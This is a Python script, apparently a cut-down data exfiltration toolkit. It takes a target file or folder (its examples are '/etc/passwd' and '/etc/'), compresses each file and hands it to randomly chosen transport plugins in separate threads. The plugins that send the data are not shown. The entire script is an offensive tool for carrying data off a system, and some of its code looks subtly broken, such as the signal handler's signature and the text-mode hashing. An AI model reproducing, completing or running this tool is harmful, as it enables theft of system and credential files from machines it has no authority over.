# -*- coding: utf-8 -*-
import argparse
import hashlib
import json
import os
import random
import signal
import sys
import tempfile
import threading
import time
from os import listdir
from os.path import isfile, join
from zlib import compress

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION = True
files = {}
threads = []
config = None


class Colors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'


def display_message(message):
    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))


def warning(message):
    display_message("%s%s%s" % (Colors.WARNING, message, Colors.ENDC))


def ok(message):
    display_message("%s%s%s" % (Colors.OKGREEN, message, Colors.ENDC))


def info(message):
    display_message("%s%s%s" % (Colors.OKBLUE, message, Colors.ENDC))


# Do a md5sum of the file
def md5(file_name):
    hash_function = hashlib.md5()
    with open(file_name) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash_function.update(chunk)
    return hash_function.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
}


class Exfiltration(object):
    def __init__(self, results):
        self.plugin_manager = None
        self.protocol = {}
        self.results = results

        path = "protocols/"
        plugin = {}

        sys.path.insert(0, path)
        for f in os.listdir(path):
            file_name, ext = os.path.splitext(f)
            if ext == '.py' and self.should_use_protocol(file_name):
                mod = __import__(file_name)
                plugin[file_name] = mod.Protocol(self, config["protocols"][file_name])
                break

    def should_use_protocol(self, protocol_name):
        if self.results.protocol and protocol_name in self.results.protocol.split(','):
            return True
        else:
            return False

    def register_protocol(self, transport_method, functions):
        self.protocol[transport_method] = functions

    def get_protocol(self):
        protocol_name = random.sample(self.protocol, 1)[0]
        return protocol_name, self.protocol[protocol_name]['send']

    def log_message(self, mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)


class ExfiltrateFile(threading.Thread):
    def __init__(self, exfiltrate, file_to_send):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.exfiltrate = exfiltrate
        self.jobid = random.randint(200, 6000)
        self.checksum = md5(file_to_send)
        self.daemon = True

    def run(self):
        # registering packet
        protocol_name, protocol_send_function = self.exfiltrate.get_protocol()
        ok("Using {0} as transport method".format(protocol_name))

        # sending the data
        f = tempfile.SpooledTemporaryFile()
        e = open(self.file_to_send, 'rb')
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(data)
        f.seek(0)
        e.close()

        protocol_send_function(self, f)
        f.close()
        sys.exit(0)


def signal_handler():
    global threads
    warning('Killing DET and its subprocesses')
    os.kill(os.getpid(), signal.SIGKILL)


def main():
    global COMPRESSION, threads, config

    parser = argparse.ArgumentParser(
        description='Steganography Exfiltration Toolkit')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config.json')")
    parser.add_argument('-f', action="store", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-p', action="store", dest="protocol",
                        default=None, help="Protocol to use (eg. '-p tcp')")
    results = parser.parse_args()

    if results.config is None:
        print("Specify a configuration file!")
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    # catch Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill client")

    COMPRESSION = bool(config['compression'])
    app = Exfiltration(results)

    if results.folder is None and results.file is None:
        warning("[!] Specify a file or a folder!")
        parser.print_help()
        sys.exit(-1)
    if results.folder:
        files_to_send = ["{0}{1}".format(results.folder, f) for f in listdir(results.folder)
                         if isfile(join(results.folder, f))]
    else:
        files_to_send = [results.file]

    threads = []
    for file_to_send in files_to_send:
        info("Launching thread for file {0}".format(file_to_send))
        thread = ExfiltrateFile(app, file_to_send)
        threads.append(thread)
        thread.daemon = True
        thread.start()

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break


if __name__ == '__main__':
    main()
